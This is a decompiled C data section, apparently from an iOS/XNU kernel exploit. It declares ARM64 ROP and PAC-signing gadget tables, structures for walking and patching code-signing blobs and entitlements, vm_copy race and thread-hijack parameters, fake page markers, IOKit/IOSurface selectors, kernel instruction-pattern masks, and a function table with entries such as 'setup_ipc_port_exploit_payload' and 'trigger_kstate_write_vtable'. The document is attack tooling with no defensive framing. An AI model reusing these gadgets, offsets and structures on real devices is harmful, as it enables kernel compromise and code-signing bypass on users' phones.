//-------------------------------------------------------------------------
// Data declarations

struct physmap_gadget_table
{
  union
  {
    uint32_t exceptionReturnWords[11];
    uint16_t exceptionReturnHalfwords[22];
  };
  uint64_t ldrX0Ret;
  uint64_t movX15BrX17;
  uint64_t movX15BrX21;
  uint64_t mrsSpselRet;
  uint64_t strPacibspX1Ret;
  uint64_t pacizaStrX2Ret;
  uint64_t movX0Ret;
  uint64_t movX0X19Ret;
  uint64_t adrDataRef;
  uint64_t jumpTarget;
  uint64_t vmPageArray;
  uint64_t pmapTteTable;
};

typedef char physmap_gadget_table_ldr_offset_must_be_0x30[
  __builtin_offsetof(struct physmap_gadget_table, ldrX0Ret) == 0x30 ? 1 : -1];
typedef char physmap_gadget_table_jump_offset_must_be_0x78[
  __builtin_offsetof(struct physmap_gadget_table, jumpTarget) == 0x78 ? 1 : -1];
typedef char physmap_gadget_table_pmap_offset_must_be_0x88[
  __builtin_offsetof(struct physmap_gadget_table, pmapTteTable) == 0x88 ? 1 : -1];

struct thread_hijack_allocation_candidate
{
  uint64_t size;
  uint64_t pageCount;
};

struct mach_voucher_u64_recipe
{
  uint32_t key;
  uint32_t command;
  uint32_t previousVoucher;
  uint32_t contentSize;
  uint64_t content;
};

struct iokit_notify_dispatch_gadgets
{
  uint64_t notificationSelector;
  uint64_t taskPortIpcKobjectOffset;
  uint64_t pacgaCluster;
  uint64_t pacgaX5StoreRet;
  uint64_t paciaStoreRet;
  uint64_t pacdaStoreRet;
  uint64_t threadStateHelper;
  uint64_t pageInfoHelper;
  uint64_t pacgaStoreRet;
};

struct xnu_runtime_info
{
  char *versionString;
  uint64_t packedVersion;
  uint32_t defaultOffsets[4];
  uint32_t versionDependentOffset;
  uint32_t socDependentOffset;
};

struct csblob_walk_ctx
{
  uint32_t flags;
  uint32_t reserved_0x4;
  uint64_t csblobKaddr;
  size_t blobSize;
  uint64_t blobDataKaddr;
  uint64_t chainHeadKaddr;
  uint64_t teamIdOrEntitlementsKaddr;
  uint32_t containerKind;
  uint32_t reserved_0x34;
  void *container;
  uint32_t selectedSlot;
  uint32_t pid;
  uint32_t platformByte;
  uint32_t specialSlotOffset;
  uint32_t alternateSlotOffset;
  uint32_t cmsBlobOffset;
  uint32_t signatureOffset;
  uint32_t minSlotDistanceQword;
  uint8_t prefersDerEntitlements;
  uint8_t modifiedDerEntitlements;
  uint16_t reserved_0x62;
};

typedef char csblob_walk_ctx_container_kind_offset_must_be_0x30[
  __builtin_offsetof(struct csblob_walk_ctx, containerKind) == 0x30 ? 1 : -1];
typedef char csblob_walk_ctx_container_offset_must_be_0x38[
  __builtin_offsetof(struct csblob_walk_ctx, container) == 0x38 ? 1 : -1];
typedef char csblob_walk_ctx_selected_slot_offset_must_be_0x40[
  __builtin_offsetof(struct csblob_walk_ctx, selectedSlot) == 0x40 ? 1 : -1];
typedef char csblob_walk_ctx_pid_offset_must_be_0x44[
  __builtin_offsetof(struct csblob_walk_ctx, pid) == 0x44 ? 1 : -1];
typedef char csblob_walk_ctx_min_slot_distance_offset_must_be_0x5c[
  __builtin_offsetof(struct csblob_walk_ctx, minSlotDistanceQword) == 0x5c ? 1 : -1];
typedef char csblob_walk_ctx_der_preference_offset_must_be_0x60[
  __builtin_offsetof(struct csblob_walk_ctx, prefersDerEntitlements) == 0x60 ? 1 : -1];

struct csblob_procinfo_header
{
  uint8_t reserved_0x00[20];
  uint32_t entryBytes;
  uint8_t reserved_0x18[8];
  uint8_t entries[];
};

struct csblob_procinfo_entry
{
  uint32_t type;
  uint32_t size;
  uint32_t fileOffset;
  uint32_t fileLength;
};

typedef char csblob_procinfo_header_entry_bytes_offset_must_be_0x14[
  __builtin_offsetof(struct csblob_procinfo_header, entryBytes) == 0x14 ? 1 : -1];
typedef char csblob_procinfo_header_entries_offset_must_be_0x20[
  __builtin_offsetof(struct csblob_procinfo_header, entries) == 0x20 ? 1 : -1];

struct csblob_proc_patch_dispatch_args
{
  struct_krwCtx *krwCtx;
  struct csblob_walk_ctx *csblobCtx;
  uint32_t result;
};

struct vm_map_entry_wire_snapshot
{
  uint64_t prev;
  uint64_t next;
  uint64_t field_0x10;
  uint64_t start;
  uint32_t pageQueueOrIndex;
  uint32_t maxProtectionAndFlags;
  uint32_t field_0x28;
  uint16_t protectionBits;
  uint16_t field_0x2e;
};

static const integer_t kVmcopyRaceLowPriorityPolicy[4] = { 0x20A51, 0x2710, 0x2711, 1 };
static const integer_t kVmcopyRaceHighPriorityPolicy[4] = { 0x3E8, 0xF4240, 0xF4241, 1 };
static const uint64_t kVmcopyFakePageMarkers[2] = { 0x43434343, 0x44444444 };

static const integer_t kThreadHijackReadyPolicy[4] = { 0x960, 0x960, 0x961, 1 };
static const integer_t kThreadHijackMainPolicy[4] = { 0x2710, 0xF4240, 0xF4241, 1 };
static const uint64_t kIokitAllocPageAndCount[2] = { 0x4000, 4 };
static const struct thread_hijack_allocation_candidate kThreadHijackAllocCandidates[3] = {
  { 0x40000000, 2 },
  { 0x30000000, 2 },
  { 0x20000000, 0 },
};
static const uint32_t kIogpuMachPortSelectors[4] = { 0x15, 0x16, 0x18, 0x19 };
static const uint32_t kIOSurfaceIdToTaskVmInfoIndex[27] = {
  0, 1, 2, 3, 4, 5,
  0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
  0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
  3, 0, 1, 2, 2, 0, 1, 4, 4, 5, 0
};
static const uint32_t kLegacyIokitSlotTypes[10] = { 17, 4, 3, 6, 7, 5, 40, 20, 2, 42 };
static const uint32_t kHashDigestSizes[4] = { 20, 32, 20, 48 };
static const uint32_t kXnuRuntimeDefaultOffsets[4] = { 0x60, 0x300, 0x730, 0x640 };
static struct iokit_notify_dispatch_gadgets gIokitNotifyDispatchGadgets;
static struct physmap_gadget_table gPhysmapGadgets;
static struct xnu_runtime_info gXnuRuntimeInfo;

#define qword_48000 gIokitNotifyDispatchGadgets.notificationSelector
#define qword_48008 gIokitNotifyDispatchGadgets.taskPortIpcKobjectOffset
#define qword_48010 gIokitNotifyDispatchGadgets.pacgaCluster
#define qword_48018 gIokitNotifyDispatchGadgets.pacgaX5StoreRet
#define qword_48020 gIokitNotifyDispatchGadgets.paciaStoreRet
#define qword_48028 gIokitNotifyDispatchGadgets.pacdaStoreRet
#define qword_48030 gIokitNotifyDispatchGadgets.threadStateHelper
#define qword_48038 gIokitNotifyDispatchGadgets.pageInfoHelper
#define qword_48040 gIokitNotifyDispatchGadgets.pacgaStoreRet
#define word_48048 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[0])
#define word_4804A (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[1])
#define word_4804C (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[2])
#define word_4804E (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[3])
#define word_48050 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[4])
#define word_48052 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[5])
#define word_48054 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[6])
#define word_48056 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[7])
#define word_48058 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[8])
#define word_4805A (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[9])
#define word_4805C (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[10])
#define word_4805E (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[11])
#define word_48060 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[12])
#define word_48062 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[13])
#define word_48064 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[14])
#define word_48066 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[15])
#define word_48068 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[16])
#define word_4806A (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[17])
#define word_4806C (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[18])
#define word_4806E (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[19])
#define word_48070 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[20])
#define word_48072 (*(int16_t *)&gPhysmapGadgets.exceptionReturnHalfwords[21])
#define qword_48078 gPhysmapGadgets.ldrX0Ret
#define qword_48080 gPhysmapGadgets.movX15BrX17
#define qword_48088 gPhysmapGadgets.movX15BrX21
#define qword_48090 gPhysmapGadgets.mrsSpselRet
#define qword_48098 gPhysmapGadgets.strPacibspX1Ret
#define qword_480A0 gPhysmapGadgets.pacizaStrX2Ret
#define qword_480A8 gPhysmapGadgets.movX0Ret
#define qword_480B0 gPhysmapGadgets.movX0X19Ret
#define qword_480B8 gPhysmapGadgets.adrDataRef
#define qword_480C0 gPhysmapGadgets.jumpTarget
#define qword_480C8 gPhysmapGadgets.vmPageArray
#define qword_480D0 gPhysmapGadgets.pmapTteTable
#define qword_480D8 gXnuRuntimeInfo.versionString
#define algn_480E0 ((uint8_t *)&gXnuRuntimeInfo.packedVersion)

#define SET_IOSURFACE_ALLOC_PAGE_AND_COUNT(dst) \
  do { \
    ((uint64_t *)&(dst))[0] = kIokitAllocPageAndCount[0]; \
    ((uint64_t *)&(dst))[1] = kIokitAllocPageAndCount[1]; \
  } while (0)

int def_3E8F0 = -17958193; // weak
int dword_4 = 16777228; // weak
int dword_8 = -2147483646; // weak
struct section_64 stru_68 =
{
  {
    '_',
    '_',
    't',
    'e',
    'x',
    't',
    '\0',
    '\0',
    '\0',
    '\0',
    '\0',
    '\0',
    '\0',
    '\0',
    '\0',
    '\0'
  },
  "__TEXT",
  24260uLL,
  242088uLL,
  24260u,
  2u,
  0u,
  0u,
  2147484672u,
  0u,
  0u,
  0u
}; // weak
char a0123456789abcd[17] = "0123456789ABCDEF"; // weak
char byte_42D30[16] =
{
  '\0',
  '\0',
  '\0',
  '3',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  'B',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
__int128 xmmword_42D40 = IDA_INT128_C(0x00000000002C4000ULL, 0x0000000000284000ULL); // weak
__int128 xmmword_42D50 = IDA_INT128_C(0x0000000000204000ULL, 0x0000000000304000ULL); // weak
__int128 xmmword_42D60 = IDA_INT128_C(0x00007FF000000000ULL, 0x0000000220000680ULL); // weak
__int128 xmmword_42D70 = IDA_INT128_C(0x0000010000000000ULL, 0x0000000000000040ULL); // weak
__int128 xmmword_42D80 = IDA_INT128_C(0x0000007000000000ULL, 0x0000000200000680ULL); // weak
__int128 xmmword_42D90 = IDA_INT128_C(0x0000000800000000ULL, 0x0000000000000010ULL); // weak
__int128 xmmword_42DA0 = IDA_INT128_C(0x00007FF000000000ULL, 0x0000000200000680ULL); // weak
_UNKNOWN unk_42DC8; // weak
__int128 xmmword_42EC0 = IDA_INT128_C(0x0000000100000001ULL, 0x0000000000000000ULL); // weak
__int128 xmmword_42F30 = IDA_INT128_C(0x00000000D280000FULL, 0x00000000D280000FULL); // weak
__int128 xmmword_42F44 = IDA_INT128_C(0x00000000FFFFFC1FULL, 0x00000000FFFFFFFFULL); // weak
__int128 xmmword_42F58 = IDA_INT128_C(0x9AC130619AC13041ULL, 0x9262F8429AC03021ULL); // weak
_UNKNOWN unk_42F68; // weak
__int128 xmmword_42F78 = IDA_INT128_C(0xD280847100000000ULL, 0xF94046E0F9000E60ULL); // weak
__int128 xmmword_42F8C = IDA_INT128_C(0xFFFFFFFF00000000ULL, 0xFFFFFFFFFFFFFFFFULL); // weak
__int128 xmmword_42FA0 = IDA_INT128_C(0xF9400000F9400008ULL, 0xB9400100F9401048ULL); // weak
__int128 xmmword_42FB0 = IDA_INT128_C(0xFFC0001FFFC0001FULL, 0xFFFFFFE0FFFFFFFFULL); // weak
__int128 xmmword_42FC0 = IDA_INT128_C(0xB9400000F9400000ULL, 0xB4000000F9400000ULL); // weak
__int128 xmmword_42FD0 = IDA_INT128_C(0xFFC00000FFC00000ULL, 0xFF000000FFC00000ULL); // weak
__int128 xmmword_42FE0 = IDA_INT128_C(0xB828680911040129ULL, 0xB868680952800008ULL); // weak
__int128 xmmword_42FF0 = IDA_INT128_C(0xFFFFFC1FFFFFFFFFULL, 0xFFFFFC1FFFE0001FULL); // weak
__int128 xmmword_43000 = IDA_INT128_C(0x00000000B900001FULL, 0xB900001FF900001FULL); // weak
__int128 xmmword_43010 = IDA_INT128_C(0x00000000FFFFFC1FULL, 0xFFFFFC1FFFFFFC1FULL); // weak
__int128 xmmword_43020 = IDA_INT128_C(0x9400000000000000ULL, 0xB4000000F9000000ULL); // weak
__int128 xmmword_43030 = IDA_INT128_C(0xFC00000000000000ULL, 0xFF00001FFFC0001FULL); // weak
__int128 xmmword_43040 = IDA_INT128_C(0x3904C01FF9000010ULL, 0xDAC10A30F2F9B431ULL); // weak
__int128 xmmword_43050 = IDA_INT128_C(0x0000000000000020ULL, 0x0000000000000100ULL); // weak
__int128 xmmword_43060 = IDA_INT128_C(0xF900000090000000ULL, 0x94000000528007C5ULL); // weak
__int128 xmmword_43070 = IDA_INT128_C(0xFFC0001F9F000000ULL, 0xFC000000FFFFFFFFULL); // weak
__int128 xmmword_43080 = IDA_INT128_C(0x58000001D503201FULL, 0x58000000D503201FULL); // weak
__int128 xmmword_43090 = IDA_INT128_C(0xFF00001FFFFFFFFFULL, 0xFF00001FFFFFFFFFULL); // weak
__int128 xmmword_430A0 = IDA_INT128_C(0xD65F03C0D5033FDFULL, 0xD5033F9FD508831FULL); // weak
__int128 xmmword_430B0 = IDA_INT128_C(0x00000000D50041BFULL, 0x0000000010000000ULL); // weak
__int128 xmmword_430C0 = IDA_INT128_C(0x00000000FFFFFFFFULL, 0x000000009F000000ULL); // weak
__int128 xmmword_430D0 = IDA_INT128_C(0x0000000000000000ULL, 0xF862782100000000ULL); // weak
__int128 xmmword_430E0 = IDA_INT128_C(0x0000000000000000ULL, 0xFFFFFFFF00000000ULL); // weak
__int128 xmmword_430F0 = IDA_INT128_C(0xEB02007FCB010003ULL, 0x910003FDA9BF7BFDULL); // weak
__int128 xmmword_43100 = IDA_INT128_C(0xAA1503E2AA1403E1ULL, 0x00000000A9408388ULL); // weak
__int128 xmmword_43110 = IDA_INT128_C(0xFFFFFFFFFFFFFFFFULL, 0x00000000FFFFFFFFULL); // weak
__int128 xmmword_43120 = IDA_INT128_C(0x8B20603FF9400021ULL, 0x5800000158000000ULL); // weak
__int128 xmmword_43130 = IDA_INT128_C(0xFFFFFFFFFFFFFFFFULL, 0xFF00001FFF00001FULL); // weak
__int128 xmmword_43140 = IDA_INT128_C(0xFFFFFFF002004000ULL, 0xFFFFFFF002000000ULL); // weak
__int128 xmmword_43150 = IDA_INT128_C(0xFFFFFFF00200C000ULL, 0xFFFFFFF002008000ULL); // weak
__int128 xmmword_43160 = IDA_INT128_C(0xFFFFFFF002014000ULL, 0xFFFFFFF002010000ULL); // weak
__int128 xmmword_43170 = IDA_INT128_C(0xFFFFFC1100170000ULL, 0xFFFFFC1100160000ULL); // weak
__int128 xmmword_43180 = IDA_INT128_C(0xFFFFFF9100170000ULL, 0xFFFFFF9100160000ULL); // weak
__int128 xmmword_43190 = IDA_INT128_C(0x0000FF004FF400FFULL, 0x0000000140198099ULL); // weak
__int128 xmmword_431A0 = IDA_INT128_C(0x000000000000041BULL, 0x0000000000000001ULL); // weak
__int128 xmmword_431B0 = IDA_INT128_C(0x0000000000003FA0ULL, 0x0000000000003F40ULL); // weak
__int128 xmmword_431C0 = IDA_INT128_C(0x0000000000003FFCULL, 0x0000000000003E00ULL); // weak
__int128 xmmword_431D0 = IDA_INT128_C(0x0000000000300000ULL, 0x00000000000003C4ULL); // weak
__int128 xmmword_431E0 = IDA_INT128_C(0x0000000000300000ULL, 0x00000000000003C5ULL); // weak
__int128 xmmword_431F0 = IDA_INT128_C(0x0000000000000000ULL, 0xFFFFFFFF80000000ULL); // weak
__int128 xmmword_43200 = IDA_INT128_C(0x0000001000000000ULL, 0x4000000100000001ULL); // weak
__int128 xmmword_43450 = IDA_INT128_C(0x0000000000000002ULL, 0x0000000000000000ULL); // weak
__int128 xmmword_43460 = 17230332160LL; // weak
__int128 xmmword_43478 = IDA_INT128_C(0x0000000000000000ULL, 0x8000000100000000ULL); // weak
uint16_t dmaFail_sbox[256] = {
  0x007, 0x00B, 0x00D, 0x013, 0x00E, 0x015, 0x01F, 0x016,
  0x019, 0x023, 0x02F, 0x037, 0x04F, 0x01A, 0x025, 0x043,
  0x03B, 0x057, 0x08F, 0x01C, 0x026, 0x029, 0x03D, 0x045,
  0x05B, 0x083, 0x097, 0x03E, 0x05D, 0x09B, 0x067, 0x117,
  0x02A, 0x031, 0x046, 0x049, 0x085, 0x103, 0x05E, 0x09D,
  0x06B, 0x0A7, 0x11B, 0x217, 0x09E, 0x06D, 0x0AB, 0x0C7,
  0x127, 0x02C, 0x032, 0x04A, 0x051, 0x086, 0x089, 0x105,
  0x203, 0x06E, 0x0AD, 0x12B, 0x147, 0x227, 0x034, 0x04C,
  0x052, 0x076, 0x08A, 0x091, 0x0AE, 0x106, 0x109, 0x0D3,
  0x12D, 0x205, 0x22B, 0x247, 0x07A, 0x0D5, 0x153, 0x22D,
  0x038, 0x054, 0x08C, 0x092, 0x061, 0x10A, 0x111, 0x206,
  0x209, 0x07C, 0x0BA, 0x0D6, 0x155, 0x193, 0x253, 0x28B,
  0x307, 0x0BC, 0x0DA, 0x156, 0x255, 0x293, 0x30B, 0x058,
  0x094, 0x062, 0x10C, 0x112, 0x0A1, 0x20A, 0x211, 0x0DC,
  0x196, 0x199, 0x256, 0x165, 0x259, 0x263, 0x30D, 0x313,
  0x098, 0x064, 0x114, 0x0A2, 0x15C, 0x0EA, 0x20C, 0x0C1,
  0x121, 0x212, 0x166, 0x19A, 0x299, 0x265, 0x2A3, 0x315,
  0x0EC, 0x1A6, 0x29A, 0x266, 0x1A9, 0x269, 0x319, 0x2C3,
  0x323, 0x068, 0x0A4, 0x118, 0x0C2, 0x122, 0x214, 0x141,
  0x221, 0x0F4, 0x16C, 0x1AA, 0x2A9, 0x325, 0x343, 0x0F8,
  0x174, 0x1AC, 0x2AA, 0x326, 0x329, 0x345, 0x383, 0x070,
  0x0A8, 0x0C4, 0x124, 0x218, 0x142, 0x222, 0x181, 0x241,
  0x178, 0x2AC, 0x32A, 0x2D1, 0x0B0, 0x0C8, 0x128, 0x144,
  0x1B8, 0x224, 0x1D4, 0x182, 0x242, 0x2D2, 0x32C, 0x281,
  0x351, 0x389, 0x1D8, 0x2D4, 0x352, 0x38A, 0x391, 0x0D0,
  0x130, 0x148, 0x228, 0x184, 0x244, 0x282, 0x301, 0x1E4,
  0x2D8, 0x354, 0x38C, 0x392, 0x1E8, 0x2E4, 0x358, 0x394,
  0x362, 0x3A1, 0x150, 0x230, 0x188, 0x248, 0x284, 0x302,
  0x1F0, 0x2E8, 0x364, 0x398, 0x3A2, 0x0E0, 0x190, 0x250,
  0x2F0, 0x288, 0x368, 0x304, 0x3A4, 0x370, 0x3A8, 0x3C4,
  0x160, 0x290, 0x308, 0x3B0, 0x3C8, 0x3D0, 0x1A0, 0x260,
  0x310, 0x1C0, 0x2A0, 0x3E0, 0x2C0, 0x320, 0x340, 0x380,
}; // weak
__int128 xmmword_436C0 = IDA_INT128_C(0x1000000000000000ULL, 0x0000000000000000ULL); // weak
__int128 xmmword_43730 = IDA_INT128_C(0xFFFFFFFFFFFFEFFFULL, 0xFFFF000000000000ULL); // weak
__int128 xmmword_43750 = IDA_INT128_C(0x0000000000000001ULL, 0x0000000000000000ULL); // weak
__int128 xmmword_43760; // weak
__int128 unk_43770; // weak
__int128 xmmword_43780; // weak
__int128 unk_43790; // weak
__int128 xmmword_437A0; // weak
__int128 unk_437B0; // weak
__int128 unk_437BC; // weak
_UNKNOWN unk_44870; // weak
_UNKNOWN unk_44890; // weak
_UNKNOWN unk_448B0; // weak
__int64 (__fastcall *off_448E0[7])() =
{
  &send_iokit_notification,
  &setup_ipc_port_exploit_payload,
  &prepare_iokit_notification_payload,
  &vtable_call_slot2,
  &setup_notification_extra_args,
  &trigger_kstate_write_vtable,
  &pack_exploit_args_buffer
}; // weak
_UNKNOWN unk_44918; // weak
_UNKNOWN unk_44938; // weak
// extern const CFAllocatorRef kCFAllocatorDefault;
// extern const CFAllocatorRef kCFAllocatorNull;
// extern const CFBooleanRef kCFBooleanFalse;
// extern const CFRunLoopMode kCFRunLoopDefaultMode;
// extern const CFDictionaryKeyCallBacks kCFTypeDictionaryKeyCallBacks;
// extern const CFDictionaryValueCallBacks kCFTypeDictionaryValueCallBacks;
// extern const mach_port_t kIOMasterPortDefault;
// extern NDR_record_t NDR_record;
// extern void *_NSConcreteStackBlock[32];
// extern uint64_t _os_alloc_once_table[]; idb
// extern mach_port_t bootstrap_port;
// extern _UNKNOWN dyldVersionNumber; weak
// extern mach_port_t mach_task_self_;
// extern vm_size_t vm_page_mask;
// extern int vm_page_shift;
// extern vm_size_t vm_page_size;


